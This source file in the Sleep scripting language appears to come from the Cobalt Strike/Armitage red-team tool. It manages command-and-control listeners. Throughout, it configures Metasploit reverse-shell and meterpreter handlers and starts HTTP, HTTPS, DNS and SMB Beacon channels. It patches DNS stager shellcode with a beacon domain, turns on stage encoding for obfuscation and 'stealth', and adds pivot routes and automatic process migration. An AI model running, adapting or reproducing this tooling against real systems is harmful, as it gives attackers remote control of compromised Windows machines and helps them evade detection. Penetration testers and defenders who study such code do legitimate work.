#
# CRUD for Listeners
#

import msf.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import javax.swing.*;
import javax.imageio.*;
import ui.*;

sub newListener {
	local('$filter $callback $3 $pivot $sid');
	listenerDialog(%(host => iff($pivot, $pivot, $MY_ADDRESS)), @($1, $2), $title => "New Listener", $button => "Save", $enable => 1, \$filter, \$callback, $updatef => iff($3, &updateListenerListLocal, &updateListenerList));
}

sub editListener {
	listenerDialog($1, @($2, $3), $title => "Edit Listener", $button => "Save", $enable => $null, $updatef => &updateListenerListLocal);
}

sub updateListenerList {
	local('$table $model $workspace');
	($table, $model) = @_;
	[$model clear: 16];
	foreach $workspace (listeners_all()) {
		[$model addEntry: $workspace];
	}
	[$model fireListeners];
}

sub updateListenerListLocal {
	local('$table $model $workspace');
	($table, $model) = @_;
	[$model clear: 16];
	foreach $workspace (listeners()) {
		[$model addEntry: $workspace];
	}
	[$model fireListeners];
}

# overwrite Armitage's Payload Chooser...
sub payloadHelper {
	_payloadHelper(lambda({
		local('$payload $port $host');
		$payload = [$_model getSelectedValueFromColumn: $table, "payload"];
		$port    = [$_model getSelectedValueFromColumn: $table, "port"];
		$host    = [$_model getSelectedValueFromColumn: $table, "host"];

		# HTTP Beacon
		if ("windows/beacon*/reverse_http" iswm $payload) {
			$payload = "windows/dllinject/reverse_http";
		}

		# HTTPS Beacon
		if ("windows/beacon*/reverse_https" iswm $payload) {
			$payload = "windows/meterpreter/reverse_https";
		}

		# SMB Beacon
		if ("windows/beacon*/reverse_tcp" iswm $payload) {
			$payload = "windows/dllinject/reverse_tcp";
		}

		# foreign listeners...
		if ("windows/foreign/reverse_http" eq $payload) {
			$payload = "windows/meterpreter/reverse_http";
		}
		else if ("windows/foreign/reverse_https" eq $payload) {
			$payload = "windows/meterpreter/reverse_https";
		}
		else if ("windows/foreign/reverse_tcp" iswm $payload) {
			$payload = "windows/meterpreter/reverse_tcp";
		}

		# get rid of the via crap
		if ("* via *" iswm $host) {
			($host, $null) = split(' via ', $host);
		}

		[$model setValueForKey: "PAYLOAD", "Value", $payload];
		[$model setValueForKey: "LHOST", "Value", $host];
		[$model setValueForKey: "LPORT", "Value", $port];
		[$model setValueForKey: "DisablePayloadHandler", "Value", "true"];
		[$model setValueForKey: "ExitOnSession", "Value", ""];
		[$model setValueForKey: "HANDLER", "Value", "false"];
		[$model fireListeners];

		[$dialog setVisible: 0];
	}, \$model));
}

sub _payloadHelper {
	local('$dialog $table $_model $choose $add $help');
	$dialog = dialog("Choose a listener", 640, 240);
	[$dialog setLayout: [new BorderLayout]];

	($table, $_model) = setupTable("name", @("name", "payload", "host", "port", "migrate"), @());
	setTableColumnWidths($table, %(name => 125, payload => 250, host => 125, port => 60, migrate => 60));
	fork({
		updateListenerList($table, $_model);
	}, \$table, \$_model, \$__frame__);
	[$table setSelectionMode: [ListSelectionModel SINGLE_INTERVAL_SELECTION]];
	
	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$choose = [new JButton: "Choose"];
	$add = [new JButton: "Add"];	
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL('http://www.advancedpentest.com/help-listener-management')];
	
	[$choose addActionListener: let($1, \$table, \$_model, \$dialog)];

	[$add addActionListener: lambda({
		newListener($table, $_model, $null);
	}, \$table, \$_model)];

	[$dialog add: center($choose, $add, $help), [BorderLayout SOUTH]];

	[$dialog setVisible: 1];
	[$dialog show];
}

sub set_lhost {
	this('$table $model');
	ask_async("What is the IP address of this system?", $MY_ADDRESS, $this);
	yield;
	if ($1 !is $null) {
		$MY_ADDRESS = $1;
		%MSF_GLOBAL["LHOST"] = $1;

		# update cortana
		[$cortana updateLocalHost: $MY_ADDRESS];

		# set the global LHOST option too!
		setg("LHOST", $MY_ADDRESS);

		#
		elog("set LHOST to $MY_ADDRESS");
		showError("Updated LHOST");
	}
};

sub setupListenerPopup {
	local('$m');
	item($1, "Debug...", 'D', lambda({
		thread(lambda({
			local('@jobs @listeners $listener');

			# we're going to need this information
			@jobs = jobs();

			# find our listener...
			@listeners = listeners();
			foreach $listener (@listeners) {
				if ($listener['name'] in @l) {
					if ("*beacon*" iswm $listener['payload'] && "*reverse_tcp*" !iswm $listener['payload']) {
						showError("You can't debug a beacon listener\n" . $listener['name']);
					}
					else if ("*foreign*" iswm $listener['payload']) {
						showError("You can't debug a foreign listener\n" . $listener['name']);
					}
					else {
						# kill the listener
						_stopListener(@jobs, $listener);

						# start the listener.
						_startListener($listener, 1);
					}
				}
			}

			# consume any messages related to the listener restarting (user will see if an error in the console)
			call_async($mclient, "armitage.query", "listener_log", "client");
		}, \@l));
	}, @l => $2));

	item($1, "Edit Host...", 'H', lambda({
		ask_async("Where should this listener stage from?", $MY_ADDRESS, lambda({
			if ($1 is $null) {
				return;
			}

			local('%names $listener @listeners @restart $l');

			# update stage host for our listeners
			@listeners = listeners();
			foreach $listener (@listeners) {
				if ($listener['name'] in @l) {
					push(@restart, $listener);
					$listener['host'] = $1;
				}
			}

			# stop them...
			stopListeners(@restart);

			# start them
			foreach $l (@restart) {
				_startListener($l);
			}

			# save them
			saveListeners(@listeners);

			# let the user know all is well
			updateListenerListLocal($table, $model);

			showError("Updated and restarted listener" . iff(size(@l) > 1, 's'));
		}, \@l, \$table, \$model));	
	}, @l => $2, \$table, \$model));
}

sub listenerPopupListener {
	if ([$1 isPopupTrigger]) {
		local('$popup $model');
		$popup = [new JPopupMenu];
		setupListenerPopup($popup, $2, \$table, \$model);
		[$popup show: [$1 getSource], [$1 getX], [$1 getY]];
		[$1 consume];
	}
}

sub listListeners {
	local('$dialog $table $model $add $edit $delete $restart $refresh $sethost $help');
	$dialog = [new JPanel];
	[$dialog setLayout: [new BorderLayout]];

	($table, $model) = setupTable("name", @("name", "payload", "host", "port", "beacons", "migrate"), @());
	setTableColumnWidths($table, %(name => 125, payload => 250, host => 125, port => 60, beacons => 250, migrate => 60));
	fork({
		updateListenerListLocal($table, $model);
	}, \$table, \$model, \$mclient, \$__frame__);

	addMouseListener($table, lambda({
		local('@listeners');
		@listeners = [$model getSelectedValues: $table];
		listenerPopupListener($1, @listeners, \$model, \$table);
	}, \$model, \$table));
	
	dispatchEvent(lambda({
		[[$table getSelectionModel] setSelectionMode: [ListSelectionModel MULTIPLE_INTERVAL_SELECTION]];
	}, \$table));

	[$dialog add: [new JScrollPane: $table], [BorderLayout CENTER]];

	$add = [new JButton: "Add"];
	$edit = [new JButton: "Edit"];
	$delete = [new JButton: "Remove"];
	$restart = [new JButton: "Restart"];
	$sethost = [new JButton: "set LHOST"];
	$refresh = [new JButton: "Refresh"];
	$help    = [new JButton: "Help"];

	[$add addActionListener: lambda({
		newListener($table, $model, 1);
	}, \$table, \$model)];

	[$sethost addActionListener: lambda(&set_lhost, \$table, \$model)];

	[$restart addActionListener: lambda({
		thread(lambda({
			local('%names $listener @listeners @go');
			putAll(%names, [$model getSelectedValues: $table], { return 1; });
			@listeners = listeners();
			foreach $listener (@listeners) {
				if ($listener['name'] in %names) {
					push(@go, $listener);
				}
			}

			local('$l');
			stopListeners(@go);
			foreach $l (@go) {
				_startListener($l);
			}
			updateListenerListLocal($table, $model);
			showListenerMessage("Restarted Listeners");
		}, \$table, \$model));
	}, \$table, \$model)];

	[$delete addActionListener: lambda({
		thread(lambda({
			local('%names $listener @listeners @go');
			putAll(%names, [$model getSelectedValues: $table], { return 1; });
			@listeners = listeners();
			foreach $listener (@listeners) {
				if ($listener['name'] in %names) {
					push(@go, $listener);
					remove();
				}
			}

			stopListeners(@go);
			saveListeners(@listeners);
			updateListenerListLocal($table, $model);
		}, \$table, \$model));
	}, \$table, \$model)];

	[$edit addActionListener: lambda({
		thread(lambda({
			local('$sel $temp');
			$sel = selected($table, $model, "name");

			$temp = search(listeners(), lambda({
				return iff($1["name"] eq $name, $1);
			}, $name => $sel));

			if ($temp !is $null) {
				editListener($temp, $table, $model, 1);
			}
		}, \$table, \$model));
	}, \$table, \$model)];

	[$refresh addActionListener: lambda({
		fork({
			updateListenerListLocal($table, $model);
		}, \$table, \$model, \$mclient, \$__frame__);
	}, \$table, \$model)];

	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-listener-management")];

	[$dialog add: center($add, $edit, $restart, $delete, $sethost, $refresh, $help), [BorderLayout SOUTH]];
	[$frame addTab: "Listeners", $dialog, $null];
}

sub listenerDialog {
	local('$table $model $filter $callback');
	($table, $model) = $2;

	local('$dialog $name $payload $port $modules @payloads @actions $migrate $host');
	$dialog = dialog($title, 640, 480);
	[$dialog setLayout: [new GridLayout: 6, 1]];

	@payloads = @(
		"generic/shell_reverse_tcp",
		"java/meterpreter/reverse_http",
		"java/meterpreter/reverse_https",
		"java/meterpreter/reverse_tcp",
		"windows/beacon_dns/reverse_http",
		"windows/beacon_http/reverse_http",
		"windows/beacon_https/reverse_https",
		"windows/beacon_smb/reverse_tcp",
		"windows/foreign/reverse_tcp",
		"windows/foreign/reverse_http",
		"windows/foreign/reverse_https",
		"windows/meterpreter/reverse_http",
		"windows/meterpreter/reverse_https",
		"windows/meterpreter/reverse_ipv6_http",
		"windows/meterpreter/reverse_ipv6_https",
		"windows/meterpreter/reverse_ipv6_tcp",
		"windows/meterpreter/reverse_tcp",
		"windows/meterpreter/reverse_tcp_dns",
		"windows/shell/reverse_ipv6_tcp",
		"windows/shell/reverse_tcp",
		"windows/shell/reverse_tcp_dns"
	);

	if ($filter !is $null) {
		@payloads = filter(lambda({ return iff($filter iswm $1, $1); }, \$filter), @payloads);
	}

	if ($1['payload'] eq "") {
		$1['payload'] = "windows/beacon_http/reverse_http";
	}

	$name  = [new ATextField: $1['name'], 20];
	[$name setEnabled: $enable];
	$payload = [new JComboBox: @payloads];
	[$payload setSelectedItem: $1['payload']];
	$host    = [new ATextField: $1['host'], 20];
	$port    = [new ATextField: $1['port'], 10];
	$migrate = [new JCheckBox: "Automatically migrate session"];
	if ($1["migrate"]) {
		[$migrate setSelected: 1];
	}

	$button = [new JButton: $button];

	[$button addActionListener: lambda({
		local('$p');
		$p = int([$port getText]);

		if ([[$name getText] trim] eq "") {
			showError("Heh?!? Your listener needs a name");
			return;
		}
		else if ([$payload getSelectedItem] eq "") {
			showError("Dude, you need to select a payload");
			return;
		}
		else if ([$host getText] eq "") {
			showError("A host is required for a listener");
			return;
		}
		else if ("," isin [$host getText]) {
			showError("Please specify one host in the host field");
			return;
		}
		else if ([$port getText] eq "") {
			showError("A port is required for a listener");
			return;
		}
		else if ($p < 0 || $p > 65535) {
			showError("Port $p is out of range.");
			return;
		}

		thread(lambda({
			local('$domains');
			# do some additional prompting if this is a DNS beacon
			if ([$payload getSelectedItem] eq "windows/beacon_dns/reverse_http") {
				ask_async("This beacon uses DNS to check for taskings. Please provide the\ndomains to use for beaconing. The NS record for these domains\nmust point to your Cobalt Strike system. Separate multiple\ndomains with a comma", $beacons, $this);
				yield;
				$domains = $1;
				if (strlen($domains) > 255) {
					showError("Make domain list less than 255 characters");
					return;
				}

				if ($domains is $null || $domains eq "") {
					return;
				}
			}
			else if ([$payload getSelectedItem] eq "windows/beacon_http/reverse_http" || [$payload getSelectedItem] eq "windows/beacon_https/reverse_https") {
				ask_async("This beacon uses HTTP to check for taskings. Please provide the\ndomains to use for beaconing. The A record for these domains\nmust point to your Cobalt Strike system. An IP address is OK.\nSeparate each host or domain with a comma.", iff($beacons eq "", $MY_ADDRESS, $beacons), $this);
				yield;
				$domains = $1;
				if (strlen($domains) > 255) {
					showError("Make domain list less than 255 characters");
					return;
				}

				if ($domains is $null || $domains eq "") {
					return;
				}
			}
			else {
				$domains = "";
			}

			# blah?
			local('$l @l $temp $done $bhttp');
			$l = listener([$name getText], [$payload getSelectedItem], [$port getText], [$migrate isSelected], [$host getText], $DESCRIBE, $domains);
			@l = listeners();
			foreach $temp (@l) {
				if ($temp['name'] eq $l['name']) {
					startListener($l, $temp);
					$temp = $l;
					$done = 1;
				}
				else if ($temp['port'] eq $l['port'] && "*foreign*" !iswm $temp['payload'] && "*foreign*" !iswm $l['payload']) {
					showError("Port " . $l['port'] . " is defined by " . $temp['name']);
					return;
				}
				else if ("*beacon*http*" iswm $temp['payload']) {
					$bhttp = $temp['name'];
				}
			}

			# go and regulate
			if ("*beacon*http*" iswm [$payload getSelectedItem] && $bhttp ne "") {
				showError("Listener: ' $+ $bhttp $+ ' is a beacon.\nYou should only have one HTTP/DNS Beacon listener at a time");
				return;
			}

			if (!$done) {
				push(@l, $l);
				startListener($l, $null);
			}

			if ($callback is $null) {
				saveListeners(@l);
				[$updatef: $table, $model];
			}
			else {
				saveListeners(@l);
				dispatchEvent(lambda({
					[$callback: [$name getText], [$payload getSelectedItem]];
				}, \$callback, \$name, \$payload));
			}
			[$dialog setVisible: 0];
		}, \$name, \$payload, \$port, \$migrate, \$table, \$model, \$dialog, \$callback, \$updatef, \$beacons, \$host));
	}, \$name, \$payload, \$port, \$migrate, \$table, \$model, \$dialog, \$callback, \$updatef, $beacons => $1['beacons'], \$host)];

	[$dialog add: label_for("Name:",    60, $name)]; 
	[$dialog add: label_for("Payload:", 60, $payload)]; 
	[$dialog add: label_for("Host:",    60, $host)];
	[$dialog add: label_for("Port:",    60, $port)]; 
	[$dialog add: $migrate]; 
	[$dialog add: center($button)];

	[$dialog pack];
	[$dialog show];
	[$dialog setVisible: 1];
}

# _stopListener(@jobs, %listener)
sub _stopListener {
	# foreign listeners are aliases, we do not need to stop them, really 
	if ("*foreign*" iswm $2['payload']) {
		return;
	}

	local('$job');
	foreach $job ($1) {
		if ($2['port'] eq $job['Port']) {
			call_async($mclient, "job.stop", $job['Id']);

			# give the job time to stop please!
			call_async($mclient, "armitage.sleep", 1000);
			remove();
		}
	}

	if ("windows/beacon*/reverse_http*" iswm $2['payload']) {
		call_async($mclient, "cloudstrike.stop_beacon", $2['port']);
	}
}

sub _startListener {
	local('$payload $port $migrate %options $domains $name $host $2 $sid');
	($name, $payload, $port, $migrate, $domains, $host) = values($1, @("name", "payload", "port", "migrate", "beacons", "host"));
	%options["LHOST"] = iff("*reverse_http*" iswm $payload, $host, iff("*ipv6*" iswm $payload, "::", "0.0.0.0"));
	%options["ExitOnSession"] = "0";
	%options["LPORT"] = $port;
	%options["PAYLOAD"] = $payload;

	# foreign listeners are aliases, we do not need to start them or do anything for them, really 
	if ("*foreign*" iswm $payload) {
		return;
	}

	# setup a pivot listener please...
	if ("* via *" iswm $host) {
		($host, $sid) = split(' via ', $host);

		# set LHOST to the pivot host...
		%options["LHOST"] = $host;

		# create a route... so MSF knows that $host is associated $sid
		cmd_safe("route add $host 255.255.255.255 $sid");
	}

	# sanity check on listener (at the very least... it'll print to the console)
	call_async($mclient, "cloudstrike.listener_sanity", $host, $port, $name, $payload);

	# if it's a Windows payload of some sort... setup the listener to automatically encode the stage as
	# it's sent. This is a nice obfuscation option, we should be taking advantage of it. Seriously.
	if ("*windows*" iswm $payload) {
		%options["EnableStageEncoding"] = "true";
	}

	if ($migrate) {
		%options["InitialAutoRunScript"] = "migrate -f";
	}

	# little adjustment to make here...
	if ($payload eq "windows/beacon_smb/reverse_tcp") {
		$payload = "windows/dllinject/reverse_tcp";
		%options["PAYLOAD"] = $payload;
	}

	if ($payload eq "windows/beacon_http/reverse_http") {
		call_async($mclient, "cloudstrike.start_beacon", %options['LPORT'], $migrate, $null, $domains, $null);
	}
	else if ($payload eq "windows/beacon_https/reverse_https") {
		call_async($mclient, "cloudstrike.start_beacon", %options['LPORT'], $migrate, $null, $domains, 1);
	}
	else if ($payload eq "windows/beacon_dns/reverse_http") {
		call_async($mclient, "cloudstrike.start_beacon", %options['LPORT'], $migrate, 1, $domains, $null);
	}
	else {
		# stage encoding meterpreter with shikata ga nai causes a CPU Spin at times... we'll use the
		# more easily signaturable call4_dword encoder to obfuscate our stage but still be safe
		%options["StageEncoder"] = "x86/call4_dword_xor";

		# debug the listener!
		if ($2) {
			# do a callback first to make sure the job is stopped before we launch the debug
			# listener...
			call_async_callback($mclient, "armitage.sleep", lambda({
				_module_execute("exploit", "multi/handler", %options, $title => $name);
			}, \%options, \$name), 10);
		}
		else {
			call_async($client, "module.execute", "exploit", "multi/handler", %options);
		}
	}
}

sub stopListeners {
	local('@jobs $l');
	@jobs = jobs();
	foreach $l ($1) {
		_stopListener(@jobs, $l);
	}
}

sub startListener {
	thread(lambda({ 
		if ($old !is $null) {
			_stopListener(jobs(), $old);
		}
		_startListener($listener); 

		# errors? display them if they exist.
		showListenerMessage("");
	}, $listener => $1, $old => $2));
}

sub listener {
	return ohash(name => $1, payload => $2, port => $3, migrate => $4, host => $5, client => $6, beacons => $7);
}

# convert a listener name in this %hash into options that we can pass to Metasploit.
# returns the payload name...
sub fixListenerOptions {
	local('$2 $nocustomhttp');

	# special cases...
	if ($1['listener'] eq "meterpreter (connect to target)") {
		$1['listener'] = $null;
		$1['LPORT'] = randomPort();

		# make our bind payloads a little more stealthy please
		$1["EnableStageEncoding"] = "true";
		$1["StageEncoder"] = "x86/call4_dword_xor";

		return "windows/meterpreter/bind_tcp";
	}
	else if ($1['listener'] eq "shell (connect to target)") {
		$1['listener'] = $null;
		$1['LPORT'] = randomPort();
		$1["EnableStageEncoding"] = "true";
		return "windows/shell_bind_tcp";
	}
	else if ($1['listener'] eq "beacon (connect to target)") {
		$1['listener'] = $null;
		$1['LPORT'] = randomPort();

		# make our bind payloads a little more stealthy please
		$1["EnableStageEncoding"] = "true";

		return "windows/dllinject/bind_tcp";
	}
	else if ($1['listener'] eq "use custom executable...") {
		if ($1['EXE::Custom'] is $null) {
			warn("$1 wants a custom EXE, but one isn't set.");
		}
		$1['listener'] = $null;
		$1['DisablePayloadHandler'] = '1';
		$1['WfsDelay'] = 60;
		return $null;
	}

	local('@l $temp $l $key $value');
	@l = listeners_all();

	foreach $temp (@l) {
		# copy listener info before transform to $2, if the parameter exists...
		if ($2) {
			clear($2);
			foreach $key => $value ($temp) {
				$2[$key] = $value;
			}
		}

		if ($1['listener'] eq ($temp['name'] . " (DNS)")) {
			local('$host $handle $data $i $file $nonce');
			# always stage to the first beacon host!!!
			$host = split(',\\s*', $temp['beacons'])[0];

			# need a random nonce to prevent cache interference during staging
			$nonce = rand(0xFFFFFF);
	
			# extract the shellcode to a temp file...
			$file   = dropFile("resources/dnsstager.bin", "dnsstager", ".bin");
			$handle = openf($file);
			$data   = readb($handle, -1);
			closef($handle);
	
			# once I have the shellcode, let's rewrite it so we can build a sane stager
			$i = indexOf($data, 'ABCDEFGHIJKLMNOPQRSTUVWXYZXXXX');
			$data = replaceAt($data, "stage. $+ $nonce $+ . $+ $host $+ \x00", $i);

			# save the rewritten stager
			$handle = openf("> $+ $file");
			writeb($handle, $data);
			closef($handle);

			# upload it I guess...
			if ($client !is $mclient) {
				$1['PAYLOADFILE'] = uploadFile($file);
			}
			else {
				$1['PAYLOADFILE'] = $file;
			}
	
			# cleanup later
			deleteOnExit($file);

			# tweak the other options
			$1['listener'] = $null;
			$1['LPORT'] = $null;
			$1['LHOST'] = $null;
			$1['ARCH']  = "x86";
			$1['PLATFORM'] = "windows";
			return "generic/custom";
		}
		else if ($1['listener'] eq $temp['name'] && "*beacon*/reverse_http*" iswm $temp['payload'] && !$nocustomhttp) {
			local('$host $handle $data $i $file $nonce');
			$file = getFileProper("httpstager" . rand(1000) . ".bin");

			# save the rewritten stager
			$handle = openf("> $+ $file");
			if ("*beacon*/reverse_https" iswm $temp['payload']) {
				writeb($handle, httpsStager($temp['host'], $temp['port'], $temp['ua']));
			}
			else {
				writeb($handle, httpStager($temp['host'], $temp['port'], $temp['ua']));
			}
			closef($handle);

			# upload it I guess...
			if ($client !is $mclient) {
				$1['PAYLOADFILE'] = uploadFile($file);
			}
			else {
				$1['PAYLOADFILE'] = $file;
			}

			# cleanup later
			deleteOnExit($file);

			$1['listener'] = $null;
			$1['LPORT'] = $null;
			$1['LHOST'] = $null;
			$1['ARCH'] = "x86";
			$1['PLATFORM'] = "windows";
			return "generic/custom";
		}
		else if ($1['listener'] eq $temp['name']) {
			# get rid of the via stuff....
			if ("* via *" iswm $temp['host']) {
				($temp['host'], $null) = split(' via ', $temp['host']);
			}

			$1['listener'] = $null;
			$1['LPORT'] = $temp['port'];
			$1['LHOST'] = $temp['host'];
			$1['DisablePayloadHandler'] = '1';

			# this should never be true now that beacon http has a custom
			# stager. I'm leaving this here in case I take out the custom stager
			if ("windows/beacon*/reverse_http" iswm $temp['payload']) {
				return "windows/dllinject/reverse_http";
			}
			# this could happen...
			else if ("windows/beacon*/reverse_https" iswm $temp['payload']) {
				return "windows/meterpreter/reverse_https";
			}
			# this could happen though... :)
			else if ("windows/beacon*/reverse_tcp" iswm $temp['payload']) {
				return "windows/dllinject/reverse_tcp";
			}

			#
			# foreign payloads are just aliases to handlers elsewhere...
			#
			else if ("windows/foreign/reverse_http" eq $temp['payload']) {
				return "windows/meterpreter/reverse_http";
			}
			else if ("windows/foreign/reverse_https" eq $temp['payload']) {
				return "windows/meterpreter/reverse_https";
			}
			else if ("windows/foreign/reverse_tcp" iswm $temp['payload']) {
				return "windows/meterpreter/reverse_tcp";
			}

			else {
				return $temp['payload'];
			}
		}
	}
	return $null;
}

sub saveListeners {
	data_clear("cloudstrike.listeners");
	data_add("cloudstrike.listeners", join("!!", map({ return join("@@", values($1)); }, $1)));
}

sub listeners_all {
	return _listeners(convertAll([$__frame__ getClients]));
}

sub listeners {
	return _listeners(@($mclient));
}

sub _listeners {
	local('$l $listener $name $payload $port $migrate @r $z $r $desc $lclient $temp $h $domains $host $u');
	foreach $desc => $lclient ($1) {
		$h = call($lclient, "armitage.my_ip")['result'];
		$z = values(_data_list($lclient, "cloudstrike.listeners"));
		$u = call($lclient, "cloudstrike.useragent")['useragent'];
		if (size($z) > 0) {
			$r = shift($z);
		}
		else {
			$r = "";
		}

		$l = split("!!", $r);
		foreach $listener ($l) {
			if ($listener ne "") {
				($name, $payload, $port, $migrate, $host, $null, $domains) = split('@@', $listener);
				if ($host is $null) {
					$host = $h;
				}
				$temp = listener($name, $payload, $port, $migrate, $host, $desc, $domains);

				# listener beacons field becomes corrupt if its blank and I specify a UA later. Better to just
				# attach this info to beacon payloads--since that's who it's for anyways
				if ($temp['beacons'] ne "") {
					$temp['ua'] = $u;
				}
	
				push(@r, $temp);
			}
		}
	}
	return @r;
}

sub showListenerMessage {
	[lambda({
		call_async_callback($mclient, "armitage.query", $this, "listener_log", "client");
		yield;
		$1 = convertAll($1)["data"];

		# build up our message
		if ($message ne "" && $1 ne "") {
			$message .= "\n\n $+ $1";
		}
		else if ($1 ne "") {
			$message = $1;
		}

		# show it, if there's something to show!
		if ($message ne "") {
			showError(["$message" trim]);
		}
	}, $message => $1)];
}

sub setupPersistentListeners {
	local('@jobs %ports $l $save @l');
	@jobs = jobs();
	putAll(%ports, map({ return $1["Port"]; }, @jobs), { return 1; });

	# first... setup a Beacon Peer DLL (before we do anything)
	call_async($mclient, "cloudstrike.start_beacon_smb");

	# setup our listeners homes.
	@l = listeners();
	foreach $l (@l) {
		if ("* via *" iswm $l['host']) {
			remove();
			$save = 1;
		}
		else if ($l['port'] !in %ports) {
			_startListener($l);
		}
	}

	# if we removed some stale listeners... then save the whole list.
	if ($save) {
		saveListeners(@l);
	}
}
